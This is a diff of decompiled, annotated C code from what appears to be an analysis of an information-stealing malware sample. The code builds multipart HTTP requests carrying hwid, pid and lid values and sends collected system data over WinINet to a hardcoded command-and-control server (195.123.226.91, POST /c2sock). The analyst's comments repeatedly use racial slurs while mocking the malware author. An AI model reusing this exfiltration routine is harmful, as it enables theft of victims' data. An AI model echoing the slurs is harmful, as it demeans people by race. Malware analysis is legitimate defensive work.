@@ -1,11 +1,11 @@
 #include "../HEADER/HEADER.c"
 
 size_t __cdecl PrcssingMultipartRequest(void *dataToSend, size_t dataSize, size_t *_bffSize)
-{   // nigga wtf this func is just doing the most basic thing—stuffing a multipart/form-data request with random junk, 
+{   // nigga wtf this func is just doing the most basic thing—stuffing a multipart/form-data request with random junk,
     // probably some HWID or other useless identifier like it some genius move.
     // It's basically taking a wide string, making it look like it does something cool, then throwing it in the header
     // Then it slaps random file data to the body like this is some fancy attack nah its just sending ur info to the C2
-    
+
     int unused1;
     int _p_SysInfoOffset;
     CHAR *ShitiStr;
@@ -24,7 +24,7 @@ size_t __cdecl PrcssingMultipartRequest(void *dataToSend, size_t dataSize, size_
     // build a multipart form request
     qmemcpy((void *)(currentPosition + _p_SysInfoOffset), "\r\nContent-Disposition: form-data; name=\"file", 44);
     qmemcpy((void *)(currentPosition + _p_SysInfoOffset + 44), "\"; filename=\"", 13);
-    
+
     // identifier or special value : 1701603686
     *(_DWORD *)(currentPosition + _p_SysInfoOffset + 57) = 1701603686;
     *(_WORD *)(currentPosition + _p_SysInfoOffset + 61) = 3362;
@@ -38,18 +38,18 @@ size_t __cdecl PrcssingMultipartRequest(void *dataToSend, size_t dataSize, size_
     return resultSize;
 }
 
-int __cdecl 
-WinnetDllFuncRelatedExfiltrationRoutineetc(const char *header_p_SysInfo, 
-                                           int extraParam, 
-                                           int dataSize, 
+int __cdecl
+WinnetDllFuncRelatedExfiltrationRoutineetc(const char *header_p_SysInfo,
+                                           int extraParam,
+                                           int dataSize,
                                            PSTR IPaddrs)
 { /*
     WinnetDllFuncRelated:
     =====================
     - well well well, again and again classic skid niggi level data theft using wininet, straight out of 2010 malware playbooks
-    - connects to 195.123.226.91 and dumps stolen system data via POST /c2sock  
+    - connects to 195.123.226.91 and dumps stolen system data via POST /c2sock
     - API calls are hashed, but any RE with 5 minutes of IDA time can resolve them nice try niggi
-    - No TLS, no encryption, just raw exfiltration over HTTP like its a school project (im just kidding niggers)  
+    - No TLS, no encryption, just raw exfiltration over HTTP like its a school project (im just kidding niggers)
     - lol, edrs or even a basic MITM packet capture would expose this in seconds
     - If that skiddi sucker stealer was advanced stealer to the dev, they should rethink their life choices
  */
@@ -75,7 +75,7 @@ WinnetDllFuncRelatedExfiltrationRoutineetc(const char *header_p_SysInfo,
     /*
     int32_t esi_2 = ResolveHashes(2073911457, Param_1)(InternetConnectA_Func(sessionHandle, "195.123.226.91", 80, ebx, ebx, 3, ebx, 1), "POST", "/c2sock", 0, 0, 0, 0, 1); // ebx == 0
     */
-    
+
     HttpOpenRequestA_Func = (int (__stdcall *)(int, const char *, const char *, _DWORD, _DWORD, _DWORD, _DWORD, int))ResolveTheHash(
         2073911457, (int)L"wininet.dll");
     requestHandle = HttpOpenRequestA_Func(connectionHandle, "POST", "/c2sock", 0, 0, 0, 0, 1);
@@ -112,7 +112,7 @@ int __fastcall AddRequestParameter(int request_p_SysInfoOffset, const void *para
     *(_BYTE *)(finalOffset + request_p_SysInfoOffset + 4) = 10;
     memmove((void *)(finalOffset + request_p_SysInfoOffset + 5), parameterValue, strlen((const char *)parameterValue));
     tempSize = strlen((const char *)parameterValue);
-    *(_WORD *)(finalOffset + tempSize + request_p_SysInfoOffset + 5) = 2573; 
+    *(_WORD *)(finalOffset + tempSize + request_p_SysInfoOffset + 5) = 2573;
     result = finalOffset + tempSize + 7;
     *_bffSize = result;
     return result;
@@ -142,16 +142,16 @@ int32_t __fastcall ProcessAndSendData(int32_t* SysInfo)
         HandleProcessing(p_SysInfo, 1);
         FinalizeData(p_SysInfo, 1);
         _free(p_SysInfo);
-    } 
+    }
     ProcessedUserID = *((unsigned __int16 *)SysInfo + 2);
-    
+
     char* header_p_SysInfo = (char *)malloc(2048);
     void* DATA = malloc(_p_SysInfo + 4096);
     PSTR formattedData = ProccessingOrMapsTheWideCharacter(&globalData);
-    // that globalData are awesome, is some next-level trash -_-, just a hardcoded mess with random junk like "aj195iak20ka99441aj1". This "genius" dev thinks this is clever, but nah—it’s probably some weak attempt at generating a HWID or a stolen key for auth, who knows? It's like they couldn't even come up with a real idea.  
-    // they take that mangled mess and throw it into a multipart HTTP request with "Content-Type: multipart/form-data; boundary=". Nigga WWtf is that, This is their big idea? Sending stolen info in the most obvious way possible?  
-    // The dev’s probably thinking theyre soo slick, but theyre just out here grabbing basic stuff like HWID, PID, lid, and sending it to a server. This is barely even hacking. It's scraping system info, tossing it into a server request, and calling it "data exfiltration" How original.  
-    // They even throw in an IP address "195.123.226.91" what a genius (lol). Grabbing an IP like it’s something special. Like no ones ever done that before.  
+    // that globalData are awesome, is some next-level trash -_-, just a hardcoded mess with random junk like "aj195iak20ka99441aj1". This "genius" dev thinks this is clever, but nah—it’s probably some weak attempt at generating a HWID or a stolen key for auth, who knows? It's like they couldn't even come up with a real idea.
+    // they take that mangled mess and throw it into a multipart HTTP request with "Content-Type: multipart/form-data; boundary=". Nigga WWtf is that, This is their big idea? Sending stolen info in the most obvious way possible?
+    // The dev’s probably thinking theyre soo slick, but theyre just out here grabbing basic stuff like HWID, PID, lid, and sending it to a server. This is barely even hacking. It's scraping system info, tossing it into a server request, and calling it "data exfiltration" How original.
+    // They even throw in an IP address "195.123.226.91" what a genius (lol). Grabbing an IP like it’s something special. Like no ones ever done that before.
     // lol, i cant reverse lazy data-stealing tool, thats enough cobbled together by some skiddie dev who probably thinks theyre reinventing the wheel. just taking stuff that's already there and sending it out in the most basic, amateur way possible
 
 
@@ -159,7 +159,7 @@ int32_t __fastcall ProcessAndSendData(int32_t* SysInfo)
     memmove(header_p_SysInfo + 44, formattedData, strlen(formattedData));
 
     header_p_SysInfo[strlen(formattedData) + 44] = 0;
-    
+
     char* requestID;
     requestID = GenerateRequestID();
     ShortSessionToken = (char *)malloc(5u);
@@ -168,9 +168,9 @@ int32_t __fastcall ProcessAndSendData(int32_t* SysInfo)
     AddRequestParameter((int)DATA, "hwid", RequestID, (unsigned int *)&ProcessedUserID);
     AddRequestParameter((int)DATA, "pid", ShortSessionToken, (unsigned int *)&ProcessedUserID);
     AddRequestParameter((int)DATA, "lid", "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", (unsigned int *)&ProcessedUserID);
-    
+
     PSTR ip195 = ProccessingOrMapsTheWideCharacter(L"195.123.226.91");
     WinnetDllFuncRelatedExfiltrationRoutineetc(header_p_SysInfo, (int)DATA, DataSizeCounter, ip195);
-    
+
     return _free(Block);
 }
